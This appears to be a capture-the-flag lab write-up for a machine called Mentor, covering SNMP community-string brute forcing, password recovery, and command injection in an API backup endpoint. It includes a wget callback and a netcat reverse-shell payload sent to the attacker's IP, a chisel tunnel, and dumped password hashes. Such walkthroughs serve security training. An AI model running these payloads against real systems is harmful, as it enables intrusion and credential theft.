# Mentor

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.228.102
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 10:29 EDT
Nmap scan report for 10.129.228.102
Host is up (0.0061s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have to add `mentorquotes.htb` to the `/etc/hosts` file to access port 80.

### Mentor Quotes API

The website has daily motivational quotes posted:

<figure><img src="../../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

Doing a subdomain enumeration reveals an `api` subdomain:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.mentorquotes.htb' --hw=26 -u http://mentorquotes.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000040:   404        0 L      2 W        22 Ch       "api"
```

When visited, it reveals nothing:

```
$ curl http://api.mentorquotes.htb                      
{"detail":"Not Found"}
```

Doing a `feroxbuster` scan reveals a LOT of endpoints present:

```
$ feroxbuster -u http://api.mentorquotes.htb 
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
405      GET        1l        3w       31c http://api.mentorquotes.htb/admin/backup
<TRUNCATED>
```

These are some interesting endpoints, and I think viewing the Documentation is the most important.&#x20;

<figure><img src="../../../.gitbook/assets/image (1334).png" alt=""><figcaption></figcaption></figure>

This is a token-based API, so when we register a new user, it would return a JWT token to us. We either have to spoof the token to become the administrator to read sensitive information, OR we have to find an injection point for RCE.&#x20;

One thing to take note of was the `Send email to James` link, which would send an email to `james@mentorquotes.htb`, and it is implied he owns the website (and is probably the administrator of this API).

Anyways we can create a user and login to retrieve our token:

{% code overflow="wrap" %}
```
$ curl -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email":"fakeuser@mentorquotes.htb", "username":"fakeuser","password":"password"}'
{"id":4,"email":"fakeuser@mentorquotes.htb","username":"fakeuser"}

$ curl -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email":"fakeuser@mentorquotes.htb", "username":"fakeuser","password":"password"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZha2V1c2VyIiwiZW1haWwiOiJmYWtldXNlckBtZW50b3JxdW90ZXMuaHRiIn0.Y2pu-kYdv7R_UoO3_myPMvdL_WryFt4hjgC0KMxtV5A"
```
{% endcode %}

Then, to access other parts of the API, we need to use this token as part of the `Authorization` HTTP Header. However, we aren't allowed to do so:

```
$ curl -X POST http://api.mentorquotes.htb/users/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZha2V1c2VyIiwiZW1haWwiOiJmYWtldXNlckBtZW50b3JxdW90ZXMuaHRiIn0.Y2pu-kYdv7R_UoO3_myPMvdL_WryFt4hjgC0KMxtV5A' 
{"detail":"Method Not Allowed"}
```

Now we already know that the user email is `james@mentorquotes.htb`, so let's try to register a user with the same email or the same username:

{% code overflow="wrap" %}
```
$ curl -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email":"james@mentorquotes.htb", "username":"fakeuser","password":"password"}'
{"id":5,"email":"james@mentorquotes.htb","username":"fakeuser"}   
   
$ curl -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email":"james@mentorquotes.htb", "username":"fakeuser","password":"password"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZha2V1c2VyIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.oTmip8hJDYfAQ6g6B_8DapuhV9gy2jo1RzY9GDNLXns"                                                                   

$ curl -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email":"testuser@mentorquotes.htb", "username":"james","password":"password"}'
{"id":6,"email":"testuser@mentorquotes.htb","username":"james"}

$ curl -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email":"testuser@mentorquotes.htb", "username":"james","password":"password"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJ0ZXN0dXNlckBtZW50b3JxdW90ZXMuaHRiIn0.3TVUdA6FaHNPUnclViOgFk1Q2FlG-NaLNPFPuoxGa2A"
```
{% endcode %}

Surprisingly, both work. However, this would lead to nowhere as I still cannot access the API using any of these tokens.

I found out later that this method was unintended, and it did work for a while before being patched.

### SNMP Brute -> James PW

I was a bit stuck here, so I referred to a writeup. Turns out, SNMP is open on this machine.&#x20;

```
$ sudo nmap --min-rate 5000 -sU 10.129.228.102     
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 10:48 EDT
Nmap scan report for mentorquotes.htb (10.129.228.102)
Host is up (0.0090s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp
```

The default community string `public` did return some information, but it was very limited. There should be another community string present, and we had to brute force it.&#x20;

We can run `snmpbrute.py` to find the possible community strings:

```
 $ /usr/share/legion/scripts/snmpbrute.py -t 10.129.228.102
     _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

Trying ['', '0', '0392a0', '1234', '2read', '3com', '3Com', '3COM', '4changes', 'access', 'adm', 'admin', 'Admin', 'administrator', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'anycom', 'ANYCOM', 'apc', 'bintec', 'blue', 'boss', 'c', 'C0de', 'cable-d', 'cable_docsispublic@es0', 'cacti', 'canon_admin', 'cascade', 'cc', 'changeme', 'cisco', 'CISCO', 'cmaker', 'comcomcom', 'community', 'core', 'CR52401', 'crest', 'debug', 'default', 'demo', 'dilbert', 'enable', 'entry', 'field', 'field-service', 'freekevin', 'friend', 'fubar', 'guest', 'hello', 'hideit', 'host', 'hp_admin', 'ibm', 'IBM', 'ilmi', 'ILMI', 'intel', 'Intel', 'intermec', 'Intermec', 'internal', 'internet', 'ios', 'isdn', 'l2', 'l3', 'lan', 'liteon', 'login', 'logon', 'lucenttech', 'lucenttech1', 'lucenttech2', 'manager', 'master', 'microsoft', 'mngr', 'mngt', 'monitor', 'mrtg', 'nagios', 'net', 'netman', 'network', 'nobody', 'NoGaH$@!', 'none', 'notsopublic', 'nt', 'ntopia', 'openview', 'operator', 'OrigEquipMfr', 'ourCommStr', 'pass', 'passcode', 'password', 'PASSWORD', 'pr1v4t3', 'pr1vat3', 'private', ' private', 'private ', 'Private', 'PRIVATE', 'private@es0', 'Private@es0', 'private@es1', 'Private@es1', 'proxy', 'publ1c', 'public', ' public', 'public ', 'Public', 'PUBLIC', 'public@es0', 'public@es1', 'public/RO', 'read', 'read-only', 'readwrite', 'read-write', 'red', 'regional', '<removed>', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'sanfran', 'san-fran', 'scotty', 'secret', 'Secret', 'SECRET', 'Secret C0de', 'security', 'Security', 'SECURITY', 'seri', 'server', 'snmp', 'SNMP', 'snmpd', 'snmptrap', 'snmp-Trap', 'SNMP_trap', 'SNMPv1/v2c', 'SNMPv2c', 'solaris', 'solarwinds', 'sun', 'SUN', 'superuser', 'supervisor', 'support', 'switch', 'Switch', 'SWITCH', 'sysadm', 'sysop', 'Sysop', 'system', 'System', 'SYSTEM', 'tech', 'telnet', 'TENmanUFactOryPOWER', 'test', 'TEST', 'test2', 'tiv0li', 'tivoli', 'topsecret', 'traffic', 'trap', 'user', 'vterm1', 'watch', 'watchit', 'windows', 'windowsnt', 'workstation', 'world', 'write', 'writeit', 'xyzzy', 'yellow', 'ILMI'] community strings ...
10.129.228.102 : 161      Version (v2c):  internal
10.129.228.102 : 161      Version (v1):   public
10.129.228.102 : 161      Version (v2c):  public
10.129.228.102 : 161      Version (v1):   public
10.129.228.102 : 161      Version (v2c):  public
Waiting for late packets (CTRL+C to stop)
```

So `internal` is another string. When used on `snmpwalk`, there is a ton of output. `snmpbulkwalk` is a better tools because it uses threading to get the information and is faster.

```
$ snmpbulkwalk -v2c -c internal 10.129.228.102             
iso.3.6.1.2.1.1.1.0 = STRING: "Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (175048) 0:29:10.48
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@mentorquotes.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "mentor"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
<TRUNCATED>
iso.3.6.1.2.1.25.4.2.1.5.2090 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
<TRUNCATED>
```

Within the output, there's a password, and we can verify that this is for `james` on the API.

{% code overflow="wrap" %}
```
$ curl -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email":"james@mentorquotes.htb", "username":"james","password":"kj23sadkj123as0-d213"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
```
{% endcode %}

### Command Injection

We can finally enumerate the API properly with this token:

{% code overflow="wrap" %}
```
$ curl -X GET http://api.mentorquotes.htb/users/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
[
  {
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  },
  {
    "id": 4,
    "email": "fakeuser@mentorquotes.htb",
    "username": "fakeuser"
  },
  {
    "id": 5,
    "email": "james@mentorquotes.htb",
    "username": "fakeuser"
  },
  {
    "id": 6,
    "email": "testuser@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 7,
    "email": "newjames@mentorquotes.htb",
    "username": "james"
  }
]
```
{% endcode %}

Earlier, we found an `/admin/backup` endpoint, so let's use that.&#x20;

<pre data-overflow="wrap"><code>$ curl -X GET http://api.mentorquotes.htb/admin/ -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq

<strong>{
</strong>  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}

$ curl -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq

{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}

$ curl -X GET http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq

{
  "detail": "Method Not Allowed"
}
</code></pre>

It appears that the `/backup` one requires a JSON input. If an empty object is supplied, it complains and asks for a `path` variable.&#x20;

{% code overflow="wrap" %}
```
$ curl -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type: application/json' -d '{"path":"/etc/passwd"}' | jq

{
  "INFO": "Done!"
}
```
{% endcode %}

I don't really know what they are doing in the backend, but we can try some command injection point just in case.&#x20;

{% code overflow="wrap" %}
```
$ curl -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -H 'Content-Type: application/json' -d '{"path":"/etc/passwd; wget 10.10.14.13/rcecfm"}' | jq

{
  "INFO": "Done!"
}
// in another shell
┌──(kali㉿kali)-[~/htb/mentor]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.228.102 - - [08/May/2023 11:01:18] code 404, message File not found
10.129.228.102 - - [08/May/2023 11:01:18] "GET /rcecfm/app_backkup.tar HTTP/1.1" 404
```
{% endcode %}

This was using `tar` on something, but more importantly our RCE worked. We can easily get a reverse shell using this after specifying some random `body` parameter:

{% code overflow="wrap" %}
```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 112

{
"body":"test",
"path": "test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 443 >/tmp/f;"
}
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3159).png" alt=""><figcaption></figcaption></figure>

There's no `/bin/bash` within this machine.

## Privilege Escalation

### Database Creds -> SSH

We can find a `config.py` file within `/app/app`.

{% code overflow="wrap" %}
```python
/app/app # cat db.py 
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
<TRUNCATED>
```
{% endcode %}

It appears there's a database present on this machine, we probably have to use `chisel` to tunnel to it.

```bash
# on kali
chisel server -p 5555 --reverse
# on machine
./chisel client 10.10.14.13:5555 R:5432:172.22.0.1:5432
```

Afterwards, we can access the database:

<figure><img src="../../../.gitbook/assets/image (2987).png" alt=""><figcaption></figcaption></figure>

We can view the databases present:

```
      Name       |  Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |   Access privileges   
-----------------+----------+----------+------------+------------+------------+-----------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/postgres          +
                 |          |          |            |            |            |                 | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/postgres          +
                 |          |          |            |            |            |                 | postgres=CTc/postgres
```

We can use `\connect mentorquotes_htb` to use that database, and then view the tables within it. Then we can enumerate the tables and select everything:

```
mentorquotes_db-# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=# select * from users;
 id |           email           |  username   |             password             
----+---------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb    | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb      | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | fakeuser@mentorquotes.htb | fakeuser    | 5f4dcc3b5aa765d61d8327deb882cf99
  5 | james@mentorquotes.htb    | fakeuser    | 5f4dcc3b5aa765d61d8327deb882cf99
  6 | testuser@mentorquotes.htb | james       | 5f4dcc3b5aa765d61d8327deb882cf99
  7 | newjames@mentorquotes.htb | james       | 5f4dcc3b5aa765d61d8327deb882cf99
```

The hash for `svc` is crackable.

<figure><img src="../../../.gitbook/assets/image (1446).png" alt=""><figcaption></figcaption></figure>

Then we can SSH in as `svc` and grab the user flag:

<figure><img src="../../../.gitbook/assets/image (3018).png" alt=""><figcaption></figcaption></figure>

### Sudo /bin/sh

`james` is present as a user, and our current user has no privileges or anything.

```
svc@mentor:/home$ ls
james  svc
```

When the `snmpd.conf` file is viewed, we can find a password:

```
svc@mentor:/etc/snmp$ tail -n 10 snmpd.conf

createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
#view SystemView included .1.3.6.1.2.1.1
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none non
```

We can then `su` to `james` using this and check our `sudo` privileges, finding that getting a `root` shell is easy:

<figure><img src="../../../.gitbook/assets/image (804).png" alt=""><figcaption></figcaption></figure>
